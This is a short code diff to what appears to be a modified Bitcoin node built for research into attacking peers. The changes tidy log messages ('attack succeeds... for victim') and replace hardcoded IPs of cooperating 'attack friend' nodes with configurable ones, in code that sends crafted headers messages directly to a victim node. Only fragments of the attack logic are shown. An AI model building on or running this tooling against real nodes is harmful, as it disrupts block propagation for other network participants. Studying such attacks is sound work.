@@ -1062,7 +1062,7 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
     {
         LOCK(cs_main);
         if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
-            LogPrintf("attack succeeds at block %s for victim %s!", inv.hash.ToString(), pfrom->addr.ToString());
+            LogPrintf("attack succeeds at block %s for victim %s!\n", inv.hash.ToString(), pfrom->addr.ToString());
         }
         BlockMap::iterator mi = mapBlockIndex.find(inv.hash);
         if (mi != mapBlockIndex.end())
@@ -1928,8 +1928,8 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 /*
                  * TODO: remove the hard code of the IP address of other attack nodes.
                  */
-                struct in_addr friend1_in_addr = { .s_addr = inet_addr("10.1.1.55") };
-                struct in_addr friend2_in_addr = { .s_addr = inet_addr("10.1.1.56") };
+                struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
+                struct in_addr friend2_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip2.c_str()) };
                 CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
                 CNode* pfriend2 = connman->FindNode((CNetAddr)friend2_in_addr);
                 //bool fsendcompact_update = false;
@@ -2864,7 +2864,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 headers_to_victim.push_back(headers[0]);
                 connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
                 pvictimState->relayed_fast_headers[headers[0].GetHash().ToString()] = 0;
-                LogPrintf("***Sending a headers message directly to victim***");
+                LogPrintf("***Sending a headers message directly to victim***\n");
             }
         }
 
